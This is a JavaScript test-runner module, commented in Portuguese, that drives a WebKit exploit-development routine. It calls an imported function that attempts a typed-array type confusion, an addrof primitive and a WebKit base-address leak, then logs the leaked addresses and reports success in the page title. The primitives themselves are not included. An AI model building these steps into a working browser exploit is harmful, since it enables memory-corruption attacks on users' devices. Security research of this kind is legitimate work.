// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para Revisado 43 - WebKit Leak)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43, // <<<< NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT // <<<< NOME DO MÓDULO ATUALIZADO
} from './testArrayBufferVictimCrash.mjs'; // Assumindo que a R43 está neste arquivo

async function runHeisenbugReproStrategy_TypedArrayVictim_R43() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    // Chama a nova função de teste R43
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43();

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred) {
        logS3(`  RUNNER R43: Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        logS3(`  RUNNER R43: Completou. Melhor OOB usado: ${result.oob_value_of_best_result || 'N/A'}`, "good", FNAME_RUNNER);
        logS3(`  RUNNER R43: Detalhes Sonda TC (Best): ${result.tc_probe_details ? JSON.stringify(result.tc_probe_details) : 'N/A'}`, "leak", FNAME_RUNNER);

        const heisenbugSuccessfullyDetected = result.heisenbug_on_M2_in_best_result;
        const addrofResult = result.addrof_result;
        const webkitLeakResult = result.webkit_leak_result;

        logS3(`  RUNNER R43: Heisenbug TC Sonda (Best): ${heisenbugSuccessfullyDetected ? "CONFIRMADA" : "NÃO CONFIRMADA"}`, heisenbugSuccessfullyDetected ? "vuln" : "warn", FNAME_RUNNER);

        if (addrofResult) {
            logS3(`  RUNNER R43: Teste Addrof (Best): ${addrofResult.msg} (Endereço vazado: ${addrofResult.leaked_object_addr || 'N/A'})`, addrofResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            logS3(`  RUNNER R43: Teste Addrof não produziu resultado ou não foi executado.`, "warn", FNAME_RUNNER);
        }

        if (webkitLeakResult) {
            logS3(`  RUNNER R43: Teste WebKit Base Leak (Best): ${webkitLeakResult.msg} (Base Candidata: ${webkitLeakResult.webkit_base_candidate || 'N/A'}, Ponteiro Interno Etapa2: ${webkitLeakResult.internal_ptr_stage2 || 'N/A'})`, webkitLeakResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            logS3(`  RUNNER R43: Teste WebKit Base Leak não produziu resultado ou não foi executado.`, "warn", FNAME_RUNNER);
        }

        if (webkitLeakResult?.success) {
            document.title = `${module_name_for_title}: WebKitLeak SUCCESS!`;
        } else if (addrofResult?.success) {
            document.title = `${module_name_for_title}: Addrof OK, WebKitLeak Fail`;
        } else if (heisenbugSuccessfullyDetected) {
            document.title = `${module_name_for_title}: TC OK, Addrof/WebKitLeak Fail`;
        } else {
            document.title = `${module_name_for_title}: No TC Confirmed`;
        }

        if (result.iteration_results_summary && result.iteration_results_summary.length > 0) {
            logS3(`  RUNNER R43: Sumário completo das iterações:`, "info", FNAME_RUNNER);
            result.iteration_results_summary.forEach((iter_sum, index) => {
                const tcSuccess = iter_sum.heisenbug_on_M2_confirmed_by_tc_probe;
                const addrofSuccess = iter_sum.addrof_result_this_iter?.success ?? 'N/A';
                const webkitLeakSuccess = iter_sum.webkit_leak_result_this_iter?.success ?? 'N/A';
                logS3(`    Iter ${index + 1} (OOB ${iter_sum.oob_value}): TC=${tcSuccess}, Addrof=${addrofSuccess}, WebKitLeak=${webkitLeakSuccess}${iter_sum.error ? `, Err: ${iter_sum.error}` : ''}`, "info", FNAME_RUNNER);
            });
        }
    } else {
        document.title = `${module_name_for_title}: Invalid Result Obj`;
    }
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_MainOrchestrator`;
    logS3(`==== INICIANDO Script 3 R43 (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    await runHeisenbugReproStrategy_TypedArrayVictim_R43(); // Chama a nova função runner
    logS3(`\n==== Script 3 R43 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
    if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) && !document.title.includes("SUCCESS") && !document.title.includes("Fail") && !document.title.includes("OK") && !document.title.includes("Confirmed")) {
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT} Done`;
    }
}
